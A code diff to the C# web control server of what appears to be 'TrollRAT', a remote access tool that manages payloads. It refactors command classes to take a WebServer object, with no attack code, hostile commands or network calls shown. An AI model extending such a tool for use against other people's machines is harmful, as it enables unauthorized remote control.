@@ -1,6 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
 using System.Net;
 using System.Text;
 using System.Text.RegularExpressions;
@@ -12,7 +10,7 @@ namespace TrollRAT.Server
 {
     public abstract class DetailCommandBase : WebServerCommand
     {
-        public DetailCommandBase(List<Payload> payloads) : base(payloads) { }
+        public DetailCommandBase(WebServer server) : base(server) { }
 
         public abstract void writeHTML(Payload payload, StringBuilder builder);
 
@@ -24,9 +22,9 @@ namespace TrollRAT.Server
             {
                 int pl = Int32.Parse(HttpUtility.ParseQueryString(context.Request.Url.Query).Get("payload"));
 
-                if (pl >= 0 && pl < payloads.Count)
+                if (pl >= 0 && pl < server.Payloads.Count)
                 {
-                    Payload payload = payloads[pl];
+                    Payload payload = server.Payloads[pl];
                     writeHTML(payload, content);
                 }
                 else
@@ -51,7 +49,7 @@ namespace TrollRAT.Server
 
     public class SettingsCommand : DetailCommandBase
     {
-        public SettingsCommand(List<Payload> payloads) : base(payloads) { }
+        public SettingsCommand(WebServer server) : base(server) { }
 
         public override Regex Path => new Regex("^/settings$");
 
@@ -66,7 +64,7 @@ namespace TrollRAT.Server
 
     public class ActionsCommand : DetailCommandBase
     {
-        public ActionsCommand(List<Payload> payloads) : base(payloads) { }
+        public ActionsCommand(WebServer server) : base(server) { }
 
         public override Regex Path => new Regex("^/actions$");
 
